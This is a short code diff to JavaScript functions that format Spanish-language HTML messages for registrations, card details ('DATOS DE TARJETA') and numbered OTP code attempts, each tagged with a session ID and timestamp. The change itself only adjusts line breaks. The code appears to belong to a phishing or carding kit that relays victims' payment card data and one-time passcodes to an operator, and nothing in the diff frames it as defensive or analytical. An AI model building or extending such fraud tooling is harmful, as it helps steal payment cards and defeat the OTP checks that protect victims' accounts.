@@ -35,6 +35,7 @@ export function formatRegistrationMessage(data) {
 ━━━━━━━━━━━━━━━━━━━━
 
 ${sessionEmojis} 
+
 <b>Sesión:</b> <code>${sessionId}</code>
 📅 <b>Fecha:</b> <code>${timestamp}</code>
 
@@ -60,7 +61,9 @@ export function formatCardDetailsMessage(data) {
     return `🔐 <b>DATOS DE TARJETA</b>
 ━━━━━━━━━━━━━━━━━━━━
 
-${sessionEmojis} <b>Sesión:</b> <code>${sessionId}</code>
+${sessionEmojis} 
+
+<b>Sesión:</b> <code>${sessionId}</code>
 📅 <b>Fecha:</b> <code>${timestamp}</code>
 
 🔢 <b>VERIFICACIÓN</b>
@@ -82,7 +85,9 @@ export function formatOTPMessage(data) {
     return `🔑 <b>CÓDIGO OTP #${attempt}</b>
 ━━━━━━━━━━━━━━━━━━━━
 
-${sessionEmojis} <b>Sesión:</b> <code>${sessionId}</code>
+${sessionEmojis} 
+
+<b>Sesión:</b> <code>${sessionId}</code>
 📅 <b>Fecha:</b> <code>${timestamp}</code>
 
 🔐 <b>CÓDIGO</b>
